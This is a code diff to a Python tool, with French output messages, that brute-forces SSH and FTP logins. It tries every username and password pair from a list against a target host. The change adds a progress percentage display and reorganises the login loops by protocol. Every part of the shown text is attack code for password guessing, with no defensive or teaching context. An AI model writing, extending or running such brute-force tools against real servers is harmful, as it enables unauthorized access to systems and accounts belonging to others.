@@ -4,7 +4,7 @@ import socket
 import time
 import ftplib
 
-def brute_force_ssh(host, p, user, passwd):
+def brute_force_ssh(host, p, user, passwd, pourcentage):
     clt = paramiko.SSHClient()
     clt.load_system_host_keys()
     clt.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -20,11 +20,11 @@ def brute_force_ssh(host, p, user, passwd):
     except paramiko.SSHException:
         print ("Try again")
         time.sleep(20)
-        return brute_force_ssh(host, p, user, passwd)
+        return brute_force_ssh(host, p, user, passwd, pourcentage)
     else:
         return True
 
-def brute_force_ftp(host, port, username, password):
+def brute_force_ftp(host, port, username, password, pourcentage):
     try:
         ftp = ftplib.FTP()
         ftp.connect(host, port)
@@ -116,17 +116,38 @@ def main():
     path = path_passwords_list()
     users = acceder_password_file(path)
     passwords = acceder_users_list(path)
-    
+    pourcentage = len(users) * len(passwords)
+    current_attempt = 0
     if users and passwords:
-        for user in users:
-            for password in passwords:
-                if brute_force_ssh(adresse_IP, port, user, password):
-                    return
-    elif protocole == 'ftp':
-        for user in users:
-            for password in passwords:
-                if brute_force_ftp(adresse_IP, port, user, password):
-                    return            
+        if protocole == 'ssh':
+            for user in users:
+                for password in passwords:
+                    current_attempt += 1
+                    print(f"Tentative {current_attempt}/{pourcentage} ({(current_attempt / pourcentage) * 100:.2f}%)")
+                    if brute_force_ssh(adresse_IP, port, user, password, pourcentage):
+                        return
+        elif protocole == 'ftp':
+            for user in users:
+                for password in passwords:
+                    current_attempt += 1
+                    print(f"Tentative {current_attempt}/{pourcentage} ({(current_attempt / pourcentage) * 100:.2f}%)")
+                    if brute_force_ftp(adresse_IP, port, user, password, pourcentage):
+                        return
+        
+
+
+
+
+    #if users and passwords:
+        #for user in users:
+            #for password in passwords:
+                #if brute_force_ssh(adresse_IP, port, user, password):
+                    #return
+    #elif protocole == 'ftp':
+        #for user in users:
+            #for password in passwords:
+                #if brute_force_ftp(adresse_IP, port, user, password):
+                    #return            
         print("Aucun mot de passe trouvé.")
     else:
         print("Aucune liste de mots de passe ou d'utilisateurs récupérée.")
